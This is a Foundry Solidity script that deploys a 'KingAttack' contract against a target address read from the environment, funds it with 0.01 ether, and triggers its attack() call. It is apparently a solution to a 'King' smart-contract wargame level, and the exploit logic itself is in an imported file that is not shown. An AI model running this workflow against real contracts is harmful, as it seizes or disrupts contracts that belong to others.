// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {KingAttack, IKing} from "../src/KingAttack.sol";

contract Deploy is Script {
    function run() external {
        address target = vm.envAddress("KING_ADDRESS");

        vm.startBroadcast();
        KingAttack attacker = new KingAttack{value: 0.01 ether}(payable(target));
        vm.stopBroadcast();
        
        console2.log("Attacker depoyed at: ", address(attacker));
        console2.log("Attacker balacnce: ", address(attacker).balance);
        console2.log("Put KING_ATTACKER_ADDRESS in .env: ");
    }
}

contract Attack is Script {
    function run() external {
        address attackerAddress = vm.envAddress("KING_ATTACKER_ADDRESS");
        address target = vm.envAddress("KING_ADDRESS");
        IKing king = IKing(target);
        KingAttack attacker = KingAttack(payable(attackerAddress));

        vm.startBroadcast();
        attacker.attack();
        vm.stopBroadcast();

        console2.log("attack finished, the owner is: ", king.owner());
    }
}